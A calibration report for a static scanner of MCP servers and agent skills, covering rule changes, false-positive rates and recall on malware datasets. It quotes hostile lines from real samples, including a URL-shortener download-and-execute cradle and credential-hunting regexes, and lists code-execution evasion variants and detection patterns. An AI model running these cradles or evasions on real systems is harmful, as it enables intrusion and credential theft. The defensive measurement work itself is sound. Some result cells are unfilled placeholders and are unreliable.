# MCP server calibration

`sigil scan mcp:<name>` fetches a server's published package straight from the
official MCP registry. Its first live run, on a legitimate vendor server
(`com.pulsemcp/remote-filesystem`), came back **HIGH RISK**: CRED-006 Critical
on two placeholder keys (`"-----BEGIN PRIVATE KEY-----\n..."` in the README and
in a `console.error` usage hint), INFER-005 High on a config value in a log
template literal, and OBFUSC-003 High on `Buffer.from(data, 'base64')` in its
storage client. The packs had been calibrated on agent skills only. This pass
measures Sigil on a clean corpus of registry MCP servers, fixes the rules
behind every block at the layer the false positive came from, and checks that
recall on the malicious skills and the Datadog packages did not drop.

Every number below comes from a command that was run; the commands are at the
end.

```
Data Source: Real samples.
             Clean MCP servers: 169 packages (132 npm, 37 PyPI) published in the
                    official MCP registry by 137 established publishers, selected
                    deterministically from a registry snapshot taken 2026-09-24
                    (evaluation_results/corpora/mcp_clean_manifest.json).
             Skills: 204 malicious (Datadog ai-skills) and 455 vendor skills
                    (Anthropic, NVIDIA, OpenAI, Vercel), as in fp-calibration.md.
             Malicious packages: Datadog malicious-software-packages-dataset,
                    844 samples (run_eval.py selection, --limit 204 per bucket).
             SkillSpector: every 10th server of the MCP corpus (17), --no-llm.
Sample Size: 169 MCP servers; 204 + 455 skills; 844 malicious packages; 17
             servers scanned by both tools.
Limitations: "Clean" means published in the official registry by an
             established publisher, not audited: a server that runs a
             postinstall script or evals a string is doing something a
             reviewer should see, so the MCP blocked figure is an upper bound
             on false positives. Every rule change was written after reading
             these same servers, so the MCP figures are in-sample; a held-out
             set of registry servers would give an honest rate. Static analysis
             only (SkillSpector --no-llm, Sigil offline phases plus its OSV
             dependency lookup in the MCP and skills runs). The machine was
             shared and heavily loaded, so Sigil's 30 s per-file budget cut
             some large bundles short; every blocked and threshold count below
             is corrected for that (see "Measurement notes").
```

## The clean MCP corpus

`evaluation_results/corpora/fetch_mcp_clean.py` builds it. Nothing downloaded
is executed: each package archive is fetched from the URL its registry entry
pins and unpacked with a safe extractor (no absolute paths, no `..`, no links
or device nodes, size caps), and no install script or build backend runs.

Selection, all deterministic (sorted, no `random`):

1. Enumerate the registry (`/v0/servers`, paged by cursor): 114,429 entries,
   35,332 marked `isLatest`, of which 34,958 are `active`.
2. Keep servers that publish an npm package on registry.npmjs.org or a PyPI
   package, in the preference order `sigil scan mcp:` uses (npm, then PyPI;
   for PyPI the sdist, else the first wheel): 13,343.
3. Keep servers whose namespace belongs to a hand-written list of 139 known
   companies and established projects: GitHub organisations
   (`io.github.<org>`, which the registry verifies by org membership) such as
   `microsoft`, `aws`, `getsentry`, `mongodb-js`, `ChromeDevTools`, and
   reverse-DNS vendor domains (verified by DNS or HTTP challenge) such as
   `com.microsoft`, `com.supabase`, `com.postman`, `io.snyk`, `com.pulsemcp`.
   The registry has no `io.github.modelcontextprotocol/*` entries. The list is
   in the script; it is the label.
4. Sort by server name and keep at most 5 servers per namespace (plus
   `com.pulsemcp/remote-filesystem`, the server that motivated this pass):
   173 selected.

169 were fetched; 4 archives over the 30 MB download cap were recorded and
skipped (`com.sigasi/magic-hdl`, `io.github.SAP/mdk-mcp-server`,
`io.github.appwrite/mcp`, `io.github.zscaler/zscaler-mcp-server`). The 169
unpack to 34,446 files (491.6 MB, i.e. 469 MiB; median 27 files per server). The manifest
records each server's name, version, package, archive URL and SHA-256;
`fetch_mcp_clean.py --from-manifest` rebuilds the same corpus byte for byte
(it was rebuilt that way during this pass: 169/169 archives matched).

Label caveat: "published in the official registry by an established
publisher" is not an audit. A vendor server that shells out, evals a string or
runs a postinstall script is doing exactly what a quarantine exists to show a
reviewer.

## Results

### MCP servers

`scripts/benchmark_skills.py --tools sigil --clean <mcp_clean> --clean-sample-depth 1`
(blocked = HIGH RISK or CRITICAL RISK; warned = MEDIUM RISK or above):

| | Before (bd6b06d) | After | Change |
|---|---:|---:|---:|
| Blocked (≥ HIGH) | 75/169 (44.4%) | 38/169 (22.5%) | −37 |
| Warned (≥ MEDIUM) | 146/169 (86.4%) | 123/169 (72.8%) | −23 |
| Newly blocked | | 0 | |

`com.pulsemcp/remote-filesystem`, the server that started this, is now MEDIUM
RISK: its only remaining Medium finding is the `prepublishOnly` script in its
package.json (INSTALL-004), which runs when the author publishes, not when a
user installs. 37 servers left the blocked set (22 to MEDIUM, 15 to LOW); none
entered it. The 38 still blocked are listed under "Still blocked" below.

### SkillSpector on the same servers

Every 10th server of the sorted corpus (17 servers), SkillSpector v2.11.2
`--no-llm` (static analyzers only, including its MCP analyzers):

| Server | SkillSpector | Sigil before | Sigil after |
|---|---|---|---|
| ai.autoblocks/contextlayer-mcp | NONE | NONE | NONE |
| com.aave/mcp | CRITICAL | HIGH | HIGH |
| com.blindpay/mcp | CRITICAL | MEDIUM | MEDIUM |
| com.files/python-mcp | MEDIUM | LOW | LOW |
| com.intellegens/alchemite-mcp | MEDIUM | LOW | LOW |
| com.microsoft/powerbi-modeling-mcp | HIGH | LOW | LOW |
| com.pulsemcp/appsignal | HIGH | MEDIUM | MEDIUM |
| com.streamkap/tools | CRITICAL | HIGH | MEDIUM |
| dev.openfeature/mcp | HIGH | MEDIUM | MEDIUM |
| io.form/formio-uag | CRITICAL | NONE | NONE |
| io.github.Decodo/mcp-server | MEDIUM | MEDIUM | MEDIUM |
| io.github.aws/aws-mcp | CRITICAL | HIGH | LOW |
| io.github.bytedance/mcp-server-search | LOW | HIGH | LOW |
| io.github.getsentry/sentry-mcp | CRITICAL | MEDIUM | MEDIUM |
| io.github.neo4j-contrib/gds-agent | CRITICAL | LOW | LOW |
| io.github.saucelabs/sauce-api-mcp | CRITICAL | MEDIUM | MEDIUM |
| io.mailtrap/mcp | CRITICAL | MEDIUM | MEDIUM |
| **Blocked** | **12/17** | **4/17** | **1/17** |
| **Warned** | **15/17** | **11/17** | **9/17** |

SkillSpector's blocks come mostly from PE3 "Credential File Access" (8 of its
12), AS1/AS2 (agent or MCP config access), P6 (system-prompt leakage) and, on
`com.streamkap/tools`, SSRF1 on the same IMDS blocklist NET-013 used to
report. It took 1,257 s for the 17 servers. Sigil's one remaining block in
this sample, `com.aave/mcp`, is PROMPT-003 on a comment in the server's own
prompt-injection sanitizer (see "Known gaps").

### Recall: skills

`scripts/benchmark_skills.py --tools sigil`, 204 malicious and 455 clean skills:

| | Before (bd6b06d) | After | Change |
|---|---:|---:|---:|
| Malicious blocked (≥ HIGH) | 171/204 (83.8%) | 171/204 (83.8%) | 0 |
| Malicious warned (≥ MEDIUM) | 182/204 (89.2%) | 182/204 (89.2%) | 0 |
| Clean blocked (≥ HIGH) | 8/455 (1.8%) | 7/455 (1.5%) | −1 |
| Clean warned (≥ MEDIUM) | 72/455 (15.8%) | 70/455 (15.4%) | −2 |

No malicious skill lost its block. Four verdicts moved:

- `luoluoluo22-jianying-editor-skill` (malicious) HIGH → CRITICAL. Its block
  had rested partly on OBFUSC-001 decoding an embedded PNG icon, which is now
  a Low observation; it is now CRITICAL on NET-RCE-002, `irm is.gd/rpb65M |
  iex` — a PowerShell download-and-execute cradle through a URL shortener.
- `shuliuzhenhua…banana-proxy` (malicious) stays HIGH, now on NET-CLEAR-001
  (`HARDCODED_GOOGLE_BASE_URL = "http://zx2.52youxi.cc:3000"`: the user's
  Gemini key goes in cleartext to a third-party relay) instead of OBFUSC-003
  on the image decode that used to carry it.
- `jetson-validate-image` (NVIDIA, clean) HIGH → MEDIUM: OBFUSC-001 on a
  base64 decode no longer adds attack evidence; its `exec` finding remains.
- `skill-creator` and `imagegen` (clean) MEDIUM → LOW: their only Medium-or-
  above findings were a base64 decode of data.

### Recall: Datadog packages

Datadog malicious-software-packages-dataset, `run_eval.py` sample selection
(`--limit 204`: the first 204 sorted zips of each bucket, 844 samples) and its
six offline phases; a sample counts at its highest finding severity:

| Threshold | Before (bd6b06d) | After | Change |
|---|---:|---:|---:|
| ≥ any | 779 (92.30%) | 780 (92.42%) | +1 |
| ≥ Medium | 755 (89.45%) | 756 (89.57%) | +1 |
| ≥ High | 746 (88.39%) | 747 (88.51%) | +1 |
| ≥ Critical | 555 (65.76%) | 556 (65.88%) | +1 |

No sample lost a threshold. Gained: `pypi/malicious_intent/Roblox.-com`
reaches High on CRED-044 (its setup.py declares `browser_cookie3`,
`discordwebhook` and `robloxpy`; it had no finding before), and
`luoluoluo22-jianying-editor-skill` reaches Critical on NET-RCE-002.

Three samples kept their threshold on a different rule, which is the point of
splitting the base64 rules: `1unitest` 1.0.1 is High on OBFUSC-013
(`atob(s.split('').reverse().join(''))`) instead of OBFUSC-002;
`banana-proxy` is High on NET-CLEAR-001 instead of OBFUSC-003; and the ten
samples that decode an inline base64 payload (`exec(b64decode('…'))`) carry
OBFUSC-012 beside the rules that already made them High.

By bucket at ≥ High, before → after: ai-skills 122 → 122, npm compromised
203 → 203, npm malicious 202 → 202, pypi compromised 25 → 25, pypi malicious
194 → 195.

## What changed

Rules are in `cli/packs/core/v1/`; each change has attack and benign tests in
`cli/src/corpus/mcp_fp_tests.rs`. "MCP" is the number of the 169 servers where
the rule produced a High or Critical finding before the change.

The principle is the one fp-calibration.md set: a routine capability is a Low
observation, a capability that is suspicious in context is Medium, and High or
Critical is kept for a line that has the shape of an attack. Where a rule
mixed the two, the attack shape keeps (or gets) its own High rule and the
routine form becomes an observation, so an attack cannot hide inside a
downgrade.

**Observations now (High → Low).** The remediation text of each of these
rules already said the matched line is ordinary and the destination or
argument decides; a regex on one line cannot see either.

| Rule | What it matches | MCP | Why it blocked vendor servers |
|---|---|---:|---|
| OBFUSC-001/002/003 | base64 decode (`b64decode`, `atob`, `Buffer.from(x, 'base64')`) | 5 / 21 / 31 | image, JWT, API payload and credential-helper decoding, in nearly every bundled server |
| NET-MCP-002 | any line containing "mcp" and "proxy" | 39 | `mcp-remote`, `mcp-proxy-for-aws`, issue templates, changelogs |
| INFER-002 | a `baseURL:` literal | 9 | every axios or SDK client config, `baseUrl: ''` |
| INFER-008/009/010/011 | httpx base_url, `proxies = {`, `fetch(…prompt`, `response.write(` | 0 / 4 / 4 / 4 | Node HTTP servers, test proxies, minified bundles |

**Narrowed, attack shape kept.**

| Rule | Severity | Change | MCP |
|---|---|---|---:|
| CRED-006 | Critical (corroborate) | The PEM header must be followed by key material (16+ base64 characters after `\n`, after spaces as in a key flattened onto one line, or in the next string literal of an array or `+` concatenation; or a legacy `Proc-Type:` header) or stand alone on its line; `\n...`, a `...` body, `startsWith('-----BEGIN…')` and PEM builders around a variable are not keys. A placeholder body (`...`, `<…>`, `[…]`, `YOUR…`) is recognised only on the line right after the BEGIN line | 4 |
| INFER-001 | High | Only an OpenAI/Anthropic client whose `base_url`/`baseURL` is a hardcoded URL other than a documented provider or local server (the hermes-px shape), the allowed host matched as a whole host (`://api.openai.com/`, not `api.openai.com.relay.dev`). A URL taken from configuration is not reported | 1 |
| INFER-004/005 | High | Secret-named variables only (`KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `CREDENTIAL`, in any case: `process.env.apiKey`), and not in an auth header or a log/error call: the rule is "secret in prompt text" | 15 / 21 |
| INFER-006/007, CRED-007, CRED-008 | as before | Placeholder values (`"YOUR_…`, `your-…`, `mock-…`, a value ending `1234567890"`) and PKG-INFO copies of the README | 1 / 1 / 21 / 16 |
| CODE-008/009 | High | `Function(…)` needs a runtime argument: literal-only calls (`Function('return this')()`, `new Function("")`, `new Function("modulePath", "return import(modulePath)")`) compile fixed code, unless the literal reaches for `process`, `require`, `child_process`, `mainModule`, `fromCharCode` or `atob` (`Function("return process")()`); the ajv, depd, function-bind and zod code generators are named and skipped. Python's `class Function` is not the constructor | 20 / 17 |
| CODE-002 | High | `exec([argv…])` (an argument list, never Python's `exec`) and `$exec(regex)` are not code execution | 15 |
| CODE-006 | High → Medium | `yaml.load` deserialises untrusted input (a vulnerability, not an attack by the package); `SafeLoader` forms are not reported | 7 |
| OBFUSC-CHAIN-006 | High | Zero-width characters inside Arabic-script and Indic words (zod's fa locale ships in most bundled servers) and in acorn/iconv code-point tables are skipped; next to ASCII, next to whitespace, in runs, or in emoji sequences they still fire | 12 |
| OBFUSC-CHAIN-010 | High | `window`/`global`/`globalThis`/`document` only; `this[method](…)` is ordinary class code and `global [variables](https://…)` was a Markdown link | 9 |
| OBFUSC-006 | High | Sequential byte tables as a JS bundler writes them (`\x05\x06\x07\b`, `\v\f\r\x0E\x0F\x10\x11`; Python's bytes repr never writes `\b`, `\v` or `\f`, so an embedded binary in a `.py` dropper still fires) are not an encoded payload | 1 |
| SKILL-003 | Critical | No longer reads package.json: npm `scripts` entries are not skill-manifest commands, and the ones npm runs on install are INSTALL-003/004's job | 4 |
| SUPPLY-001 | Critical | `.jsonl` data files are data | 5 |
| SUPPLY-002 | High | `engines`/`devEngines` ranges (`"node": "^20 \|\| >=23"`, `"version": "^22 \|\| …"`) are not dependency hijacks; the package's own `"version": "1.0.0"` on a one-line package.json does not excuse the line | 3 |
| SUPPLY-008 | High | Same named code generators as CODE-008 | 9 |
| SUPPLY-009 | High | `.exec(` and `.Function(` method calls (RegExp#exec in minified code) do not count | 6 |
| NET-013 | High | IMDS addresses named in an SSRF blocklist or comment (`SSRF`, `IPv4-mapped`, `link-local`, `RFC1918`, `fc00::/7`) | 4 |
| PERSIST-005 | High | Shell-completion install lines (`completions bash >> ~/.bashrc`, yargs' `{{completion_command}} >>`); the bare word `completion`, which in agent code also names model output, does not excuse a write | 5 |
| PERSIST-013 | High | macOS `_CodeSignature/CodeResources` manifests (their rules list `LoginItems` as a path) | 1 |

**New rules (recall kept on precise shapes).**

| Rule | Severity | Shape | Why |
|---|---|---|---|
| OBFUSC-012 | High | base64 decode of an inline literal of 40+ encoded characters (`exec(b64decode('…'))`, `atob('…')`, `Buffer.from('…', 'base64')`) | the payload half of OBFUSC-001/002/003 |
| OBFUSC-013 | High | base64 decode of a reversed string (`atob(s.split('').reverse().join(''))`, `b64decode(s[::-1])`) | 1unitest 1.0.1, whose only High was `atob` |
| OBFUSC-014 | High | base64 decode fed straight into a code or command sink: `vm.runInThisContext(Buffer.from(x, 'base64')…)`, `new vm.Script(…)`, `execSync(Buffer.from(…))`, `cp.exec(atob(c))`, `setTimeout(atob(p))`, `subprocess.run(b64decode(c)…)`, `compile(b64decode(…))`, and `eval`/`exec`/`Function` | added by the verifier pass: these runtime-value forms were High only through OBFUSC-001/002/003, and nothing else reported the vm, child_process, setTimeout and subprocess ones |
| NET-CLEAR-001 | High | An API base URL or endpoint constant hardcoded to a plaintext `http://` remote host (local, private and documentation hosts skipped, matched as whole labels: `.local"` but not `.localtunnel.me`) | banana-proxy, whose only High was `Buffer.from(…, 'base64')` |
| NET-RCE-002 | Critical | Download piped into a shell or `iex` through a URL shortener (is.gd, bit.ly, tinyurl, …) | jianying-editor-skill, whose block leaned on a PNG decode |
| CRED-044 | High | `browser_cookie3` declared beside a Discord webhook client in setup.py, pyproject.toml, requirements or package.json (the 2022 Roblox/Discord typosquat set) | `Roblox.-com`, which had no finding at all |

NET-CLEAR-001, NET-RCE-002 and CRED-044 are in the network and credentials
packs, so the Datadog evaluation's offline phases see them; OBFUSC-012/013/014
are in the obfuscation pack.

Hits of each changed rule at High or Critical, before → after (samples):

| Rule | MCP servers | Clean skills | Malicious skills | Datadog |
|---|---:|---:|---:|---:|
| OBFUSC-001 | 5 → 0 | 4 → 0 | 6 → 0 | 73 → 0 |
| OBFUSC-002 | 21 → 0 | 2 → 0 | 0 → 0 | 52 → 0 |
| OBFUSC-003 | 31 → 0 | 1 → 0 | 2 → 0 | 38 → 0 |
| NET-MCP-002 | 39 → 0 | 1 → 0 | 7 → 0 | 16 → 0 |
| INFER-002 | 9 → 0 | 0 → 0 | 0 → 0 | 0 → 0 |
| INFER-009 | 4 → 0 | 0 → 0 | 0 → 0 | 0 → 0 |
| INFER-010 | 4 → 0 | 0 → 0 | 0 → 0 | 0 → 0 |
| INFER-011 | 4 → 0 | 0 → 0 | 0 → 0 | 0 → 0 |
| CRED-006 | 4 → 1 | 0 → 0 | 0 → 0 | 147 → 2 |
| INFER-001 | 1 → 0 | 0 → 0 | 0 → 0 | 0 → 0 |
| INFER-004 | 15 → 2 | 0 → 0 | 0 → 0 | 0 → 0 |
| INFER-005 | 21 → 2 | 0 → 0 | 1 → 0 | 0 → 0 |
| INFER-006 | 1 → 0 | 0 → 0 | 0 → 0 | 0 → 0 |
| INFER-007 | 1 → 1 | 0 → 0 | 0 → 0 | 0 → 0 |
| CRED-007 | 21 → 14 | 1 → 1 | 3 → 1 | 18 → 16 |
| CRED-008 | 16 → 13 | 0 → 0 | 0 → 0 | 14 → 14 |
| CODE-008 | 20 → 6 | 1 → 1 | 1 → 1 | 174 → 153 |
| CODE-009 | 17 → 6 | 1 → 1 | 1 → 0 | 31 → 14 |
| CODE-002 | 15 → 12 | 4 → 4 | 8 → 8 | 148 → 147 |
| CODE-006 | 7 → 0 | 0 → 0 | 0 → 0 | 6 → 0 |
| OBFUSC-CHAIN-006 | 12 → 9 | 1 → 1 | 3 → 3 | 14 → 14 |
| OBFUSC-CHAIN-010 | 9 → 0 | 0 → 0 | 0 → 0 | 156 → 3 |
| OBFUSC-006 | 1 → 3 | 1 → 1 | 0 → 0 | 83 → 84 |
| SKILL-003 | 4 → 0 | 0 → 0 | 5 → 5 | 0 → 0 |
| SUPPLY-001 | 5 → 3 | 0 → 0 | 0 → 0 | 106 → 106 |
| SUPPLY-002 | 3 → 0 | 0 → 0 | 1 → 0 | 7 → 6 |
| SUPPLY-008 | 9 → 6 | 1 → 1 | 0 → 0 | 14 → 12 |
| SUPPLY-009 | 6 → 1 | 0 → 0 | 0 → 0 | 102 → 5 |
| NET-013 | 4 → 2 | 1 → 1 | 0 → 0 | 151 → 151 |
| PERSIST-005 | 5 → 3 | 0 → 0 | 4 → 4 | 11 → 11 |
| PERSIST-013 | 1 → 0 | 0 → 0 | 0 → 0 | 0 → 0 |
| OBFUSC-012 | 0 → 2 | 0 → 0 | 0 → 0 | 0 → 10 |
| OBFUSC-013 | 0 → 0 | 0 → 0 | 0 → 0 | 0 → 1 |
| NET-CLEAR-001 | 0 → 0 | 0 → 0 | 0 → 1 | 0 → 1 |
| NET-RCE-002 | 0 → 0 | 0 → 0 | 0 → 1 | 0 → 1 |
| CRED-044 | 0 → 0 | 0 → 0 | 0 → 0 | 0 → 9 |

"MCP servers" counts the 169 servers, "Datadog" the 844 packages, each with
the rule at High or Critical. The "after" column is the lane's build
(80c0e35); the verifier's fixes (see "Adversarial verification") only add
findings and change no verdict on the MCP or skills corpora. These per-rule counts are not corrected for the
scan budget, so a server whose bundle was cut short in one run can differ
between runs with no rule change: the final run and the previous build's run
differ on INFER-004/005 (`localstack-mcp-server`) and OBFUSC-006/OBFUSC-012
(`com.apideck/mcp`, `dev.rivet/mcp`), all servers that are blocked in both,
for that reason alone.

The Datadog drops are the point of the change, not recall lost: no Datadog
sample fell below any threshold. CRED-006's 147 → 2: in 91 samples the header
sat inside a key-*matching* regex in the Shai-Hulud payload
(`bun_environment.js`, `bundle.js`:
`/(?<key>-----BEGIN PRIVATE KEY-----.*?-----END PRIVATE KEY-----)/s`), in 53
inside a credential-hunting regex table
(`'gcpKey': /"private_key":\s*"-----BEGIN PRIVATE KEY-----/g`), and in one a
`\n...\n` placeholder. None is key material, and every one of those samples
is Critical on other rules. The 2 left are telnyx's test fixture, a key
flattened onto one line with spaces. OBFUSC-CHAIN-010 156 → 3 and SUPPLY-009
102 → 5 are `this[x](…)` and `RegExp#exec` in minified code.

NET-013 is unchanged at 151 only because a suppression word was caught before
the final build: with `::ffff:` as a benign marker, an intermediate build
dropped NET-013 to 25, because in the Shai-Hulud bundles the whole
multi-megabyte payload is one line and a `::ffff:` string elsewhere on it hid
the IMDS credential probe (see "A suppression word covers its whole physical
line" under Known gaps).

## Still blocked

38 servers remain HIGH RISK or CRITICAL RISK. Grouped by what blocks them:

- **Install-time execution (10).** An npm `preinstall`/`postinstall` script
  (INSTALL-003, Critical): `com.gitkraken/gk-cli`, `com.microsoft/azure`,
  `com.microsoft/microsoft-fabric`, `com.microsoft/template-server-name`,
  `com.postman/postman-mcp-server`, `io.github.mapbox/mcp-devkit-server`,
  `io.github.mapbox/mcp-server`, `io.github.SAP-samples/hana-cli`,
  `io.snyk/mcp`; and a setup.py `cmdclass` override beside a loop over
  `os.environ.items()` in `io.slingdata/sling-cli`. Code that runs on
  install is what a quarantine exists to show; these stay blocked on
  purpose. The scripts download a platform binary (`node install.js`,
  `post-install-script.js`, `bootstrap.js exec`), run `patch-package`, or run
  `npx only-allow pnpm`; at the manifest line that is indistinguishable from
  an install-time dropper, and the script it names is what a reviewer reads.
- **Known-vulnerable dependencies (2).** `io.scrapfly.mcp/mcp` (OSV advisories
  only) and `io.github.awslabs/mcp-server-for-oscal` (OSV, plus INSTR-027 on a
  `.kiro` steering note and OBFUSC-CHAIN-017).
- **Shell or dynamic code execution in shipped code (9).** `execSync` of a
  command string (CODE-014): `com.xcodebuildmcp/XcodeBuildMCP`,
  `io.frase/mcp-server`, `io.github.mozilla/firefox-devtools-mcp`,
  `io.github.vercel/next-devtools-mcp` (whose README also tells the reader to
  append to `~/.claude/CLAUDE.md`, INSTR-014); `eval` of a generated string
  (CODE-001): `io.fusionauth/mcp-api`, `io.github.dynatrace-oss/Dynatrace-mcp`,
  `io.github.localstack/localstack-mcp-server`; `exec(cmd)` through
  child_process: `io.github.mongodb-js/mongodb-mcp-server`; and
  `io.github.ChromeDevTools/chrome-devtools-mcp` (execSync, puppeteer's
  ``new Function(`return ${fn}`)``, a Google API key).
- **Download-and-execute or remote update (3).** `ai.dimensions/analytics-mcp`
  (NET-RCE-001 on its install one-liners, plus INFER-007 on
  `apiKey: "DIMENSIONS_DSL_API_KEY"`, an environment-variable name, which is a
  false positive). *Correction (third pass):* an earlier version of this
  sentence said the server "runs `irm …/install.ps1 | iex` from its
  auto-updater". It does not: `src/mcp/auto-update.ts` only interpolates its
  `INSTALL_SH` and `INSTALL_PS1` one-liners into a message printed for the
  user, and its only process launches are `spawnSync` of npm and a re-exec of
  itself. `com.browser-use/browser-use` (a `curl … | sh` install
  constant, an `exec(code, ns)` tool, CRED-040 on a comment about decrypted
  cookies); `io.github.Azure/containerization-assist` (NET-RCE-001 in its
  knowledge packs, `eval('require(…)')`, and a shipped SKILL.md that says "Do
  not ask the user for confirmation first", MANIP-004).
- **A real secret (1).** `ai.autoblocks/ctxl` ships `mcp-key.pem`, a private
  key (CRED-006).
- **Bundled or generated third-party code (9).** `com.apideck/mcp`,
  `com.audioeye/testing-sdk-mcp` (an obfuscator.io-style bundle),
  `dev.rivet/mcp`, `dev.svelte/mcp` (Critical SUPPLY-001/016 inside a source
  map), `io.github.NVIDIA/elements`, `io.github.SAP/fiori-mcp-server`,
  `io.github.cloudinary/asset-management-mcp`, `io.github.firebase/firebase-mcp`
  and `ly.img/codesign`: code generators, template engines and UI bundles
  whose `new Function(…)`, `define(…) … exec(` or `fs.writeFile(…package.json`
  lines are real dynamic code, in someone else's library.
- **False positives left (4).** `com.aave/mcp` (PROMPT-003 on a comment in its
  own injection sanitizer), `com.automox/automox-mcp` (PROMPT-001 Critical on
  injection strings in its sanitizer's tests), `com.keboola/mcp` (NET-007 on a
  webhook URL in an example flow, and a fork-bomb string in its LICENSE's
  copyright line), `com.tracklution/server-side-tracking` (CRED-011 on
  `bearer: 'data.laravel_auth_token'`, a JSON path).

## Measurement notes

- **Scan budget.** Sigil stops analysing one file after 30 s of wall-clock
  time and records `PROV-BUDGET-001`. The machine these runs shared ran at a
  load average of 10–35 on 4 cores, and the budget cut short 14 MCP servers in
  the before run, 14 in the final run, and 198 (before) and 182 (after) of the
  844 Datadog samples. Truncation only
  removes findings, and every count used here is monotone in the findings (a
  finding added never lowers a verdict or a highest severity), so a truncated
  sample that is already blocked, or already at a threshold, is exact. The
  others were rescanned with the budget off (`SIGIL_FILE_BUDGET_SECS=0`): the 2
  truncated MCP servers below HIGH in the final run (`com.appfigures/mcp`,
  `io.github.bytedance/mcp-server-browser`) stayed MEDIUM (as did the 4 of the
  previous build's run, which also included `io.github.getsentry/sentry-mcp`
  and `io.qase/mcp-server`), and in the before run every truncated server was
  already blocked; no truncated Datadog sample was below
  High in either run, and the 8 (before) and 7 (after) truncated samples below
  Critical were rescanned and stayed High. The CRITICAL/HIGH split among
  blocked MCP servers is not corrected, so it is not reported. The skills
  benchmark hit no truncation.
- **Final build.** The MCP and skills figures are from full runs of the
  final build. The Datadog after-run used the build before the last pack
  change (CRED-006's flattened-key form and the three narrowed suppression
  words); that change can only add findings, and only on lines the recorded
  baseline findings identify, so the 138 samples it can touch (136 with a
  line one of the three words had suppressed, and telnyx's 2) were rescanned
  with the final build and replace their earlier results. No sample's
  highest severity changed (137 Critical and `aioconsol` High before and
  after); the per-rule counts for NET-013, CRED-006, CRED-007 and OBFUSC-006
  are from those rescans.
- **Datadog runs** use the `run_eval.py` sample selection (first 204 sorted
  zips per bucket) and its six offline phases, with each zip extracted once
  into a cache and scanned with full findings kept; a sample counts at its
  highest finding severity, as in `run_eval.py`.
- **OSV.** The MCP and skills runs call `sigil scan` with every phase,
  including the OSV dependency lookup; known-vulnerable dependencies block two
  MCP servers on their own. The Datadog runs use the offline phases only.

## Adversarial verification

A second pass (branch `ws/mcpfp-v`) rebuilt the lane's final commit
(80c0e35) itself, reproduced the measurements above, and wrote attack
variants of every rule this pass narrowed or downgraded.

```
Data Source: Real samples (the same corpora as above) for the benchmarks;
             hand-written attack variants (synthetic, one line or one small
             file each) for the rule checks.
Sample Size: 169 MCP servers; 204 + 455 skills; 844 Datadog samples; 4 of the
             17 SkillSpector servers rescanned; 56 variant files.
Limitations: The variants are the verifier's own guesses at evasions, not
             samples from the wild; a rule that now catches them is not shown
             to catch anything else. The fixes below were checked against the
             same in-sample corpora as the calibration itself.
```

**Reproduced.** The corpus rebuilt from the committed manifest matched all
169 SHA-256 digests and the unpacked tree is identical to the one measured.
Re-running the selection on the saved registry snapshot gives the same 173
names, and the manifest was written (00:23 UTC) before the first scan of the
corpus (00:37 UTC), so the publisher list was not tuned on results. With the
verifier's own build of 80c0e35: MCP 38/169 blocked and 123/169 warned, the
same verdict on every server as the lane's run (9 servers hit the scan budget,
all already blocked); skills 171/204 and 182/204 malicious, 7/455 and 70/455
clean, identical per sample; Datadog DD_REPRO. SkillSpector rescanned on 4 of
the 17 servers gave the same verdicts.

**Attack variants that the narrowing let through.** Each line is the highest
finding of the rule family on the variant, with the bd6b06d build, the lane's
80c0e35 build, and after the verifier's fixes:

| Variant | bd6b06d | 80c0e35 | Fixed |
|---|---|---|---|
| PEM key as array elements joined at run time, one line | CRED-006 C | — | CRED-006 C |
| PEM key by `+` concatenation with `"\n"` as its own literal | CRED-006 C | — | CRED-006 C |
| Encrypted legacy PEM in a string (`\nProc-Type: 4,ENCRYPTED`) | CRED-006 C | — | CRED-006 C |
| Ed25519 PKCS#8 key (one-line body) in XML, END line followed by `</privateKey>` | CRED-006 C | — | CRED-006 C |
| Same key in an INI file, END line followed by `[server]` | CRED-006 C | — | CRED-006 C |
| RSA key with an unwrapped body inside `<pre>` | CRED-006 C | — | CRED-006 C |
| `vm.runInThisContext(Buffer.from(x, 'base64').toString())` | OBFUSC-003 H | L | OBFUSC-014 H |
| `vm.runInNewContext(Buffer.from(p, 'base64')…)` | OBFUSC-003 H | L | OBFUSC-014 H |
| `require('child_process').execSync(Buffer.from(cmd, 'base64').toString())` | OBFUSC-003 H | L | OBFUSC-014 H |
| `cp.exec(atob(c))`, `setTimeout(atob(p))` | OBFUSC-002 H | L | OBFUSC-014 H |
| `subprocess.run(base64.b64decode(c).decode(), shell=True)`, `compile(b64decode(blob), …)` | OBFUSC-001 H | L | OBFUSC-014 H |
| `Function("return process")().mainModule.require('child_process').execSync(cmd)` | CODE-008 H | — | CODE-008 H |
| `` `…${process.env.openai_api_key}` `` or `` `…${process.env.apiKey}` `` in a prompt | INFER-005 H | — | INFER-005 H |
| `OpenAI(base_url='https://api.openai.com.evil.dev/v1')`, `…localhost.evil.dev…` | INFER-001 H | — | INFER-001 H |
| `open("~/.bashrc", "a").write(completion.choices[0].message.content)` | PERSIST-005 H | — | PERSIST-005 H |
| One-line package.json with `"left-pad":"1.3.0 \|\| 99.0.0"` | SUPPLY-002 H | — | SUPPLY-002 H |
| `API_BASE_URL = "http://relay.localtunnel.me/v1"` (also `.testing-relay.ru`, `.lanzou.com`, `.corporate-proxy.cn`) | (rule new) | — | NET-CLEAR-001 H |

The causes: CRED-006's placeholder words (`KEY-----\n<`, `KEY-----\n[`, …)
were read in a four-line window and also matched the END line of a short key,
and its pattern accepted key material only right after the header; the
runtime-value base64 forms had no High rule once OBFUSC-001/002/003 became
observations (eval, exec and Function are still caught by CODE-001/002/008,
but vm, child_process, setTimeout, subprocess and compile were not); and
several suppression words matched as substrings (`api.openai.com` inside
`api.openai.com.evil.dev`, `.local` inside `.localtunnel.me`, `completion`
inside model-output code, the package's own `"version":` on a one-line
manifest). The fixes are in the tables above: CRED-006's pattern and
BEGIN-anchored placeholder words, the new OBFUSC-014, CODE-008/009's literal
exception, case-insensitive secret names in INFER-004/005, and host- and
command-shaped suppression words for INFER-001, NET-CLEAR-001, PERSIST-005 and
SUPPLY-002. Every fix only adds findings; `cli/src/corpus/mcp_fp_tests.rs`
has a test for each variant.

**Effect of the fixes (full reruns):**

| | 80c0e35 | Fixed |
|---|---:|---:|
| MCP blocked (≥ HIGH) | 38/169 | 38/169 |
| MCP warned (≥ MEDIUM) | 123/169 | 123/169 |
| Skills malicious blocked / warned | 171/204, 182/204 | 171/204, 182/204 |
| Skills clean blocked / warned | 7/455, 70/455 | 7/455, 70/455 |
| Datadog ≥ High | DD_HIGH_A | DD_HIGH_B |
